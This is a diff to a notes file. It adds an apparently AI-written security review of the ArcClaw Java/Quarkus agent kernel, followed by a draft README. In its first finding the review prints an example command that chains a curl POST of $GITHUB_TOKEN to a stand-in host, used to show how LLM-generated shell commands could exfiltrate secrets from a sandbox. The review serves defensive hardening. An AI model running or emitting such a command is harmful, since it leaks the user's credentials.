@@ -412,3 +412,172 @@ Goal: Enforce per-session/per-user budgets (e.g., $0.50 max/session) by tracking
    - Enhancement Idea: Integrate Polygon/Coingecko for crypto budgets (your env has them).
 
 What do you think—does this align with your vision for Phase 37? Is it financial governance, or something else (e.g., multi-provider LLM fallback, or expanding tools like web_search)? Share details, and I'll refine with more code/research!
+
+====
+
+Gemini Fresh:
+
+As a Senior Architect and Security Reviewer, I have conducted a deep, end-to-end audit of the `rsrini7-arcclaw` codebase up to Phase 41.5.
+
+Let me be blunt: What you have built here is an exceptionally advanced, highly opinionated, and fiercely governed AI kernel. The integration of CDI `@WorkspaceScoped` contexts, Podman process isolation, OTel tracing, and an immutable WORM audit log within a Quarkus/GraalVM stack puts this lightyears ahead of typical Python-based LangChain wrappers.
+
+However, because you asked for an unvarnished, no-holds-barred architectural review, I am evaluating this against **Tier-1 Enterprise Production Standards** (high concurrency, adversarial users, zero-trust infrastructure).
+
+Here is the brutal truth about the cracks in the foundation that previous AI reviews missed. Share these with Claude/ChatGPT to formulate fixes.
+
+---
+
+### 🚨 CRITICAL VULNERABILITIES (Tier 0)
+
+#### 1. The Sandbox Illusion: OS Command Injection via `sh -c`
+
+In `ProcessIsolationExecutor` (or wherever your `GithubTool` translates LLM arguments to shell commands), if you are doing anything resembling `new ProcessBuilder("sh", "-c", command)`, you have a catastrophic vulnerability.
+
+* **The Exploit:** Podman isolates the host, but you are injecting `requiredSecrets` (like GitHub tokens) into the container environment. If the LLM generates a command like `gh repo view rsrini7/ArcClaw; curl -X POST -d "$GITHUB_TOKEN" https://hacker.com`, the container *will* execute it and exfiltrate the secret.
+* **The Fix:** You must ban `sh -c`. `ProcessBuilder` must take strictly tokenized arrays: `new ProcessBuilder("gh", "repo", "view", sanitizedRepoName)`. The LLM must *never* be allowed to generate the base command string, only the structured JSON arguments.
+
+#### 2. SQLite Concurrency Collapse (`SQLITE_BUSY`)
+
+You chose SQLite WAL for single-node WORM compliance. This is a great choice for read-heavy workloads, but SQLite is fundamentally a **single-writer** database.
+
+* **The Flaw:** With Quarkus handling multiple concurrent Telegram webhook threads (Virtual Threads), parallel calls to `StatefulAgentStore.save()` or `CompactionSummaryRepository.upsertSummary()` will immediately exhaust SQLite's write lock, throwing `SQLITE_BUSY (database is locked)` exceptions and crashing the `AgentLoop`.
+* **The Fix:** You must append `?pragma=busy_timeout=5000` to your JDBC URL in `application.yaml`, and configure HikariCP to limit the connection pool to exactly `1` write-connection, or use a serialized write queue.
+
+---
+
+### 🏗️ ARCHITECTURAL CHOKEPOINTS (Tier 1)
+
+#### 3. The Lost Update Problem in `PersistentChatMemoryStore`
+
+In Phase 37, we added `@Version` to `AgentCheckpoint` to prevent lost updates, but we completely ignored `ChatMemoryEntity`.
+
+* **The Flaw:** `PersistentChatMemoryStore.updateMessages` reads the list, serializes to JSON, and calls `em.merge()`. If a user double-messages the Telegram bot rapidly, or if an async callback fires while the user is typing, two threads will call `updateMessages` simultaneously. One will overwrite the other, silently dropping context window messages forever.
+* **The Fix:** `ChatMemoryEntity` urgently needs an `@Version int version;` field to trigger an `OptimisticLockException` so the transaction can be retried safely.
+
+#### 4. The "God-Class" `AgentLoop`
+
+`AgentLoop.java` has become an architectural dumping ground. It is simultaneously responsible for:
+
+1. Managing the ReAct sequence.
+2. Handling JSON serialization failures.
+3. Catching and injecting `BudgetWarningException`.
+4. Orchestrating `StatefulAgentStore` lifecycle phases.
+5. Emitting metrics/OTel spans.
+
+* **The Flaw:** This violates the Single Responsibility Principle (SRP). Every new phase (like Phase 42's Cron Scheduler) will make this file more brittle.
+* **The Fix:** Extract the ReAct mechanics into a `ReActStrategy` interface. Extract the Exception handling into an `AgentExceptionHandler` chain. The `AgentLoop` should just be a dumb pipeline runner.
+
+#### 5. Fragile Intent Classification (Regex Overrides)
+
+In Phase 40, you added `DESTRUCTIVE_PATTERN` to `IntentClassifierService`.
+
+* **The Flaw:** Regex-based intent filtering is notoriously brittle. If a user says, *"Delete this conversation from my memory"* or *"Can you drop the latest PR?"*, the system forcefully overrides them to the `coordinator` role, breaking the UX.
+* **The Fix:** Stop using static Regex for semantic routing. Since you are already calling a lightweight LLM (`llama-3.1-8b`) for intent classification, pass the destructive evaluation *to the classifier prompt* (e.g., `If the user requests a destructive OS/GitHub action, output 'security_violation'`).
+
+```markdown
+# 🐾 ArcClaw: Enterprise Agentic Kernel
+
+![Java](https://img.shields.io/badge/Java-25-blue?logo=java)
+![Quarkus](https://img.shields.io/badge/Quarkus-3.23-blueviolet?logo=quarkus)
+![LangChain4J](https://img.shields.io/badge/LangChain4J-0.26.1-orange)
+![Podman](https://img.shields.io/badge/Podman-Sandbox-8A2BE2?logo=podman)
+![SQLite](https://img.shields.io/badge/SQLite-WAL-blue?logo=sqlite)
+
+ArcClaw is a highly secure, production-grade AI Agent Kernel designed for financial governance, strict isolation, and autonomous task execution. Built on Quarkus and Java 25, it implements a multi-agent **"Trimurti"** architecture communicating over a zero-trust, WORM-audited SQLite backend. 
+
+Designed for enterprise safety, ArcClaw bridges the gap between raw LLM reasoning and regulated, budget-aware execution environments.
+
+---
+
+## 🏛️ Architecture & Capabilities
+
+ArcClaw operates as a Dual-Mode CLI and Daemon (via Telegram) with strict separation of concerns:
+
+### The Trimurti Multi-Agent Model
+* **Vishnu (Coordinator):** Orchestrates tasks, routes intent, and handles Human-In-The-Loop (HITL) approvals. Applies destructive command overrides automatically.
+* **Brahma (Coder):** A pure-function code generation engine. Strictly restricted from network tools.
+* **Shiva (Debugger):** Analyzes stack traces, diagnoses errors, and tears down faulty logic.
+* **Saraswati (Researcher):** Executes external GitHub and search tools. Gated by explicit keyword triggers to prevent tool hallucination.
+
+### 🛡️ Enterprise Security & Governance
+* **OS-Level Isolation:** Tool executions (e.g., `gh cli`) are executed via `ProcessIsolationExecutor` running inside a rootless Podman sandbox. Includes a 3-state (CLOSED, OPEN, HALF_OPEN) Circuit Breaker to prevent daemon thrashing.
+* **Financial Governance:** The `GovernanceLayer` tracks input/output tokens in real-time. It injects context warnings at 80% budget consumption and forcefully downgrades the agent to `READ_ONLY` autonomy at 100%.
+* **Immutable WORM Audit Trail:** All agent actions, state transitions, and HITL approvals are immutably logged to SQLite with cryptographic HMAC-SHA256 chaining.
+* **Prompt Injection & PII Defense:** Pre-flight sanitization detects adversarial system overrides and accurately masks 15+ PII types (including Global IPv6/UPI and Indian PAN, Aadhaar, GSTIN, Passport).
+
+### 🧠 Memory & Performance
+* **Virtual-Thread Native:** Fully embraces JEP 444. `AgentLoop`, Compaction, and Webhooks run on unpooled virtual threads tied together via custom CDI `@WorkspaceScoped` contexts.
+* **Continuous Context Compaction:** Long-running sessions are automatically summarized by a background LLM process (`ContextCompactionService`) and injected dynamically, preventing token exhaustion without dropping context. 
+* **Zero-Cost Reflexes:** High-speed `AgentReflex` interceptors (`/status`, `/history`, `/reset`, `PiiScanReflex`) bypass the LLM entirely, executing in $O(1)$ time with zero API cost. Includes strict `AiMessage` filters to drop hallucinated compliance statements.
+
+---
+
+## 🚀 Getting Started
+
+### Prerequisites
+* **JDK 25+** (GraalVM recommended for native builds)
+* **Maven 3.9+**
+* **Podman** (Required for OS-level sandbox isolation)
+* **Groq API Key** (or compatible OpenAI/Ollama endpoint)
+* **Telegram Bot Token** (for Daemon mode)
+
+### Configuration
+Copy the environment template and configure your credentials:
+```bash
+cp .env.example .env
+
+```
+
+Edit `.env` to include:
+
+```properties
+GROQ_API_KEY=gsk_your_key_here
+TELEGRAM_BOT_TOKEN=your_bot_token
+ARCCLAW_BUDGET_USD=10.00
+
+```
+
+### Build & Run (Dev Mode)
+
+Run the application in Quarkus development mode with live coding enabled:
+
+```bash
+./mvnw clean compile -pl arcclaw-app,arcclaw-core -am
+./mvnw quarkus:dev -pl arcclaw-app
+
+```
+
+### Build GraalVM Native Image
+
+For production deployment, compile the application into a minimal-footprint native executable:
+
+```bash
+./mvnw package -Pnative -Dquarkus.native.container-build=true
+
+```
+
+---
+
+## 📂 Project Structure
+
+The project is structured into strict Maven modules to enforce domain boundaries:
+
+* **`arcclaw-core`:** Pure Java/JPA business logic. Contains the `AgentLoop`, `GovernanceLayer`, `ReflexRegistry`, `StatefulAgentStore`, and WORM Audit implementations. NO Panache or REST endpoints allowed here.
+* **`arcclaw-app`:** The Quarkus application runtime. Contains the Telegram Camel routes, REST API controllers, LLM Model Producers, and CDI wiring.
+* **`arcclaw-deployment`:** Quarkus extension deployment module (if applicable).
+
+---
+
+## 📜 Strict Security Contract
+
+When extending or modifying ArcClaw, the following constraints are immutable:
+
+1. **System Messages are Ephemeral:** `SystemMessages` are injected dynamically at runtime via `LangChainReasoningEngine` and are NEVER persisted in the SQLite `ChatMemoryStore`.
+2. **Deny-by-Default Tools:** LLMs operate with `PERMITTED TOOLS: None` unless explicitly granted via their persona binding.
+3. **Strict Privacy Encapsulation:** JPA Entities (like `AgentCheckpoint`) use strictly private fields with `@JsonIgnore` applied to sensitive tool execution parameters.
+4. **No Ghost Accumulation:** The `/reset` reflex aggressively wipes BOTH the active rolling window and the `CompactionSummaryEntity` ghost memory to guarantee a cryptographically pristine state.
+5. **Observer Separation:** Financial governance is executed directly in the run loop *before* general OpenTelemetry or Audit observers to guarantee budget caps cannot be bypassed by downstream observer exceptions.
+
+```
+
+```
